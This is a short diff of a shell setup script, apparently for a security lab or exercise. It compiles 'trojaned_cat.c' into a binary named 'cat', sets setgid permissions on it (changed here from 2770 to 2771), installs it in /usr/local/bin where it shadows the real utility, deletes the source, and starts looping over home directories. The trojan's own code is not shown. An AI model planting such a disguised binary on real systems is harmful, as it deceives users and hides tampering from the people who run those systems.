@@ -3,7 +3,7 @@ cd files
 gcc -o mystery mystery.c
 rm mystery.c
 gcc -o cat trojaned_cat.c
-chmod 2770 cat
+chmod 2771 cat
 mv cat /usr/local/bin
 rm trojaned_cat.c
 for f in `find /home -maxdepth 1 -type d`; do 
